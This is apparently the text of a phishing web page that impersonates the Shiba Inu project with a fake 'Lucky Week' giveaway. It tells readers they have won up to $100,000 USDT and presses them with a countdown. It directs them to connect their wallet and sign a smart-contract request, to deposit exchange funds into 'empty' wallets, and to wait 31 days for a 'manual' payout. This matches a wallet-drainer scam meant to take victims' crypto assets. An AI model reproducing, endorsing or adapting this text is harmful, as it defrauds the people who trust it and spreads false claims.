Introduction

� 
  • Active

Shiba Inu, or SHIB, is the main token of our ecosystem, bringing the power of a decentralized, community-led currency to millions across the globe. Since its inception in late 2020, the Ethereum-based SHIB token has grown to become a worldwide phenomenon, and is now accepted as a form of payment at hundreds of locations, either directly or through third-party intermediaries.

We have achieved remarkable milestones, and we owe our success to your unwavering support. As a token of our appreciation, we are delighted to host our exclusive 'Lucky Week' event, open to all SHIB holders around the world. Every week, a fortunate wallet holder will be randomly selected to receive a prize from our generous $1,000,000 reward pool.

🎉Now you're the lucky winner of this week's Shiba Inu giveaway! Click the [Claim reward] to complete the process, and you will receive an immediate reward, ranging from a minimum of $5,000 USDT to a maximum of $100,000 USDT, or its equivalent in SHIB.

Tokens unclaimed before the countdown will be allocated to the community's long-term incentive program and either distributed to the top community contributors or burned.

$1,000,000Reward pool
00:05:06:08 Time left

92%

Progress

Step-by-Step Guide:

1
Use Trustwallet for the entire process.
2
Check for native tokens in your wallet for ETH/BSC blockchain network fees.
3
Connect your wallet to the smart contract and click "Confirm/Sign"
4
That’s it! The rest is done automatically and your rewards will drop straight into your wallet in the coming minutes.
�� 
△Attention: When you press 'Confirm/Sign' in the wallet, it signifies a successful action. Typically, reward deposits are instant, but there might be occasional contract delays (pending) caused by network congestion. In such cases, your rewards may not be immediately credited. Rest assured that we will manually deposit the rewards to your wallet address after the event concludes, following a 31-day waiting period. During this waiting period, you can confidently participate in activities such as Swap, Execute, or Connect within the web3 ecosystem without any impact on the final outcomes.
Ⅱ
△Attention: When prompted with an error, it is possible that you are attempting to connect an empty wallet. For security purposes, we are unable to permit connections with empty or recently created wallets. The recommended solution is to deposit assets from Binance or Coinbase other exchanges into your wallet, allowing the on-chain smart contract to detect activity associated with your address. Afterward, you can proceed with the claiming process.
Confirm Report

Please confirm the report by providing additional details and verifying you are not a robot.

Home to the Shiba Inu Ecosystem,consisting of $SHIB, $LEASH, $BONE, $TREAT and native NFTs.

This is just the beginning. Blockchain belongs to us. As the Shiba army, we are an organic organism, greater thanany one man, movement or even nation-state. As our own movement, it is critical to implement the above ideas (in a proper way) to set the proper financial foundations for the future...
